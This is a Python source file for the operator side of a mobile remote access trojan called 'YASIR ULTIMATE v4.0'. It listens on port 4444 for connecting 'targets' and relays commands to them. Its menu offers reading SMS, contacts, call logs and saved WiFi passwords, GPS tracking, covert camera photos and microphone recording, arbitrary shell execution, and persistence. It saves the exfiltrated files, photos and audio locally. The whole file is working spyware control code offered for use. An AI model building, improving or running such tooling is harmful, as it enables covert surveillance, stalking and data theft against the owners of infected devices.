#!/usr/bin/env python3
# YASIR ULTIMATE v4.0 - Maximum Control Edition
import socket, threading, os, sys, time, json, base64

SRV = '0.0.0.0'
PRT = 4444

R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
B = '\033[1;34m'
M = '\033[1;35m'
C = '\033[1;36m'
W = '\033[0m'

def banner():
    os.system('clear')
    print(f"""{R}
  ██╗░░░██╗░█████╗░░██████╗██╗██████╗░
  ╚██╗░██╔╝██╔══██╗██╔════╝██║██╔══██╗
  ░╚████╔╝░███████║╚█████╗░██║██████╔╝
  ░░╚██╔╝░░██╔══██║░╚═══██╗██║██╔══██╗
  ░░░██║░░░██║░░██║██████╔╝██║██║░░██║
  ░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░╚═╝╚═╝░░╚═╝
{R}╔══════════════════════════════════════════╗
║{G}  YASIR ULTIMATE v4.0{R}                  ║
║{Y}  Maximum Control - Unlimited Power{R}    ║
╚══════════════════════════════════════════╝{W}
""")

def handle(conn, addr, cid):
    print(f"{G}[+]{W} Target {cid}: {addr[0]}")
    print(f"{Y}[!]{W} Type 'menu' for all commands\n")
    
    while True:
        try:
            cmd = input(f"\n{R}┌──({G}YASIR{R})-({Y}{cid}{R})\n└─{C}>{W} ").strip()
            
            if cmd in ['exit', '0', 'quit']:
                conn.send(b'exit')
                break
                
            elif cmd == 'menu' or cmd == 'help':
                print(f"""
{Y}╔══════════════════════════════════════════════════════════╗
║              YASIR ULTIMATE - COMMAND CENTER            ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║ {C}══ DEVICE INTELLIGENCE ══{W}                              ║
║ {G}  info          {W}- Complete device information            ║
║ {G}  device_deep   {W}- Deep hardware + software details     ║
║ {G}  properties    {W}- All system properties                ║
║ {G}  env           {W}- Environment variables                ║
║ {G}  uptime        {W}- Device uptime + load                 ║
║ {G}  id            {W}- User/group IDs                       ║
║                                                          ║
║ {C}══ NETWORK ══{W}                                          ║
║ {G}  ip            {W}- All IP addresses                     ║
║ {G}  mac           {W}- MAC addresses                        ║
║ {G}  gateway       {W}- Default gateway                      ║
║ {G}  dns           {W}- DNS servers                          ║
║ {G}  ports         {W}- Open/listening ports                 ║
║ {G}  connections   {W}- Active connections                   ║
║ {G}  wifi_scan     {W}- Nearby WiFi networks                 ║
║ {G}  wifi_saved    {W}- Saved WiFi passwords                 ║
║ {G}  wifi_info     {W}- Current WiFi connection              ║
║ {G}  signal        {W}- Cellular signal strength             ║
║ {G}  operator      {W}- Network operator info                ║
║ {G}  neighbours    {W}- ARP table / network neighbours      ║
║ {G}  speedtest     {W}- Network speed test (ping)           ║
║                                                          ║
║ {C}══ LOCATION ══{W}                                         ║
║ {G}  location      {W}- GPS coordinates + maps link          ║
║ {G}  altitude      {W}- Altitude reading                     ║
║ {G}  speed         {W}- Current speed (m/s)                  ║
║ {G}  bearing       {W}- Direction/heading                    ║
║ {G}  address       {W}- Reverse geocode address              ║
║ {G}  track_start   {W}- Start GPS tracking (5s intervals)   ║
║ {G}  track_stop    {W}- Stop GPS tracking                    ║
║                                                          ║
║ {C}══ CONTACTS & COMMUNICATION ══{W}                          ║
║ {G}  contacts      {W}- All contacts with numbers            ║
║ {G}  contacts_raw  {W}- Raw contact data (JSON)              ║
║ {G}  contacts_search <n> {W}- Search contacts by name        ║
║ {G}  sms           {W}- SMS inbox                            ║
║ {G}  sms_sent      {W}- SMS sent messages                    ║
║ {G}  sms_unread    {W}- Unread SMS count                     ║
║ {G}  sms_from <n>  {W}- SMS from specific number             ║
║ {G}  sms_send <n> <m> {W}- Send SMS                          ║
║ {G}  calls         {W}- Call history                          ║
║ {G}  calls_missed  {W}- Missed calls                         ║
║ {G}  calls_dialed  {W}- Dialed numbers                       ║
║ {G}  calls_received{W}- Received calls                       ║
║ {G}  call <n>      {W}- Make a call                          ║
║                                                          ║
║ {C}══ APPLICATIONS ══{W}                                      ║
║ {G}  apps          {W}- ALL installed apps                    ║
║ {G}  apps_user     {W}- User installed apps                   ║
║ {G}  apps_system   {W}- System apps                          ║
║ {G}  apps_running  {W}- Currently running apps               ║
║ {G}  apps_recent   {W}- Recently used apps                   ║
║ {G}  open_app <p>  {W}- Open application by package          ║
║ {G}  kill_app <p>  {W}- Force stop application               ║
║ {G}  app_info <p>  {W}- App details (version, permissions)   ║
║                                                          ║
║ {C}══ FILES & STORAGE ══{W}                                    ║
║ {G}  storage       {W}- Storage usage summary                ║
║ {G}  storage_full  {W}- Detailed storage info                ║
║ {G}  ls <path>     {W}- List directory                       ║
║ {G}  ls_recursive <p> {W}- Recursive directory listing       ║
║ {G}  cd <path>     {W}- Change directory                     ║
║ {G}  pwd           {W}- Current directory                    ║
║ {G}  cat <file>    {W}- View file contents                   ║
║ {G}  download <f>  {W}- Download file from device            ║
║ {G}  upload <f>    {W}- Upload file to device                ║
║ {G}  delete <f>    {W}- Delete file                          ║
║ {G}  search <name> {W}- Search files by name                 ║
║ {G}  du <path>     {W}- Directory size                       ║
║ {G}  dcim          {W}- List camera photos                   ║
║ {G}  downloads     {W}- Download folder contents             ║
║ {G}  documents     {W}- Documents folder                     ║
║ {G}  whatsapp      {W}- WhatsApp media folder                ║
║ {G}  telegram      {W}- Telegram folder                      ║
║ {G}  music         {W}- Music files                          ║
║ {G}  videos        {W}- Video files                          ║
║                                                          ║
║ {C}══ SYSTEM CONTROL ══{W}                                     ║
║ {G}  processes     {W}- Running processes table              ║
║ {G}  cpu           {W}- CPU usage                            ║
║ {G}  ram           {W}- RAM usage                            ║
║ {G}  battery       {W}- Battery status                       ║
║ {G}  temperature   {W}- Device temperature                   ║
║ {G}  sensors       {W}- All sensor readings                  ║
║ {G}  clipboard     {W}- Clipboard content                    ║
║ {G}  notifications {W}- Read notifications bar               ║
║ {G}  accounts      {W}- Device accounts                      ║
║ {G}  calendar      {W}- Calendar events                      ║
║ {G}  shell <cmd>   {W}- Execute any shell command            ║
║ {G}  python <code> {W}- Execute Python code                  ║
║                                                          ║
║ {C}══ MEDIA ══{W}                                              ║
║ {G}  screenshot    {W}- Capture screen (returns file)        ║
║ {G}  photo_front   {W}- Take front camera photo              ║
║ {G}  photo_back    {W}- Take back camera photo               ║
║ {G}  record_mic <s>{W}- Record microphone (seconds)          ║
║ {G}  record_cam <s>{W}- Record camera video (seconds)        ║
║ {G}  ringtone      {W}- Current ringtone                     ║
║ {G}  wallpaper     {W}- Current wallpaper                    ║
║ {G}  media_files   {W}- All media files on device            ║
║                                                          ║
║ {C}══ ACTIONS ══{W}                                            ║
║ {G}  toast <msg>   {W}- Send notification                    ║
║ {G}  vibrate <ms>  {W}- Vibrate device                       ║
║ {G}  lock          {W}- Lock screen                          ║
║ {G}  tts <text>    {W}- Text to speech                       ║
║ {G}  flash_on      {W}- Turn on flashlight                   ║
║ {G}  flash_off     {W}- Turn off flashlight                  ║
║ {G}  volume <0-15> {W}- Set media volume                     ║
║ {G}  brightness <0-255> {W}- Set screen brightness           ║
║ {G}  wifi_on       {W}- Enable WiFi                          ║
║ {G}  wifi_off      {W}- Disable WiFi                         ║
║ {G}  bluetooth_on  {W}- Enable Bluetooth                     ║
║ {G}  bluetooth_off {W}- Disable Bluetooth                    ║
║ {G}  airplane_on   {W}- Enable airplane mode                 ║
║ {G}  airplane_off  {W}- Disable airplane mode                ║
║ {G}  silent_on     {W}- Silent mode                          ║
║ {G}  silent_off    {W}- Normal mode                          ║
║ {G}  vibrate_mode_on {W}- Vibrate mode                       ║
║ {G}  persist       {W}- Install persistence (startup)        ║
║ {G}  uninstall     {W}- Remove persistence                   ║
║                                                          ║
║ {M}══ BROWSER ══{W}                                            ║
║ {G}  browser_open <url> {W}- Open URL in browser             ║
║ {G}  browser_search <q> {W}- Search in browser               ║
║ {G}  browser_history {W}- Browser history                    ║
║ {G}  browser_bookmarks {W}- Browser bookmarks                ║
║                                                          ║
║ {M}══ SOCIAL ══{W}                                             ║
║ {G}  whatsapp_open  {W}- Open WhatsApp                       ║
║ {G}  whatsapp_msg <n> <m> {W}- WhatsApp message (via intent)║
║ {G}  telegram_open  {W}- Open Telegram                       ║
║ {G}  instagram_open {W}- Open Instagram                      ║
║ {G}  facebook_open  {W}- Open Facebook                        ║
║ {G}  youtube_open   {W}- Open YouTube                         ║
║ {G}  maps_open <q>  {W}- Open Google Maps search             ║
║                                                          ║
║ {M}══ SYSTEM INFO ══{W}                                        ║
║ {G}  menu/help     {W}- Show this menu                       ║
║ {G}  exit/quit     {W}- Close connection                     ║
╚══════════════════════════════════════════════════════════╝{W}
                """)
                continue
            
            elif cmd == '':
                continue
            
            # Send command
            try:
                conn.send(cmd.encode())
            except:
                print(f"{R}[-] Connection broken{W}")
                break
            
            # Receive response
            time.sleep(0.5)
            conn.settimeout(5)
            resp = b''
            try:
                while True:
                    chunk = conn.recv(65536)
                    if not chunk: break
                    resp += chunk
                    if chunk.endswith(b'[DONE]'):
                        resp = resp[:-6]
                        break
                    if len(chunk) < 65536: break
            except: pass
            conn.settimeout(None)
            
            if resp:
                text = resp.decode('utf-8', errors='replace')
                if text.startswith('[FILE]'):
                    parts = text.split(':', 2)
                    if len(parts) >= 3:
                        fname = parts[1]
                        fdata = base64.b64decode(parts[2])
                        with open(f'yasir_{fname}', 'wb') as f:
                            f.write(fdata)
                        print(f"{G}[+]{W} Saved: yasir_{fname} ({len(fdata)} bytes)")
                elif text.startswith('[PHOTO]'):
                    fdata = base64.b64decode(text[7:])
                    ts = int(time.time())
                    fname = f'yasir_photo_{ts}.jpg'
                    with open(fname, 'wb') as f:
                        f.write(fdata)
                    print(f"{G}[+]{W} Saved: {fname} ({len(fdata)} bytes)")
                elif text.startswith('[AUDIO]'):
                    fdata = base64.b64decode(text[7:])
                    ts = int(time.time())
                    fname = f'yasir_audio_{ts}.m4a'
                    with open(fname, 'wb') as f:
                        f.write(fdata)
                    print(f"{G}[+]{W} Saved: {fname} ({len(fdata)} bytes)")
                else:
                    print(text)
            else:
                print(f"{R}[-] No response{W}")
                    
        except KeyboardInterrupt:
            print(f"\n{R}[-] Exiting{W}")
            try: conn.send(b'exit')
            except: pass
            break
        except Exception as e:
            print(f"{R}[-] {e}{W}")
            break
    
    try: conn.close()
    except: pass
    print(f"{R}[-] Target {cid} disconnected{W}")

def start():
    banner()
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((SRV, PRT))
    s.listen(10)
    
    print(f"{G}[+]{W} Server: {SRV}:{PRT}")
    print(f"{Y}[!]{W} Waiting for targets...\n")
    
    cid = 0
    while True:
        conn, addr = s.accept()
        cid += 1
        t = threading.Thread(target=handle, args=(conn, addr, cid))
        t.daemon = True
        t.start()

if __name__ == '__main__':
    start()
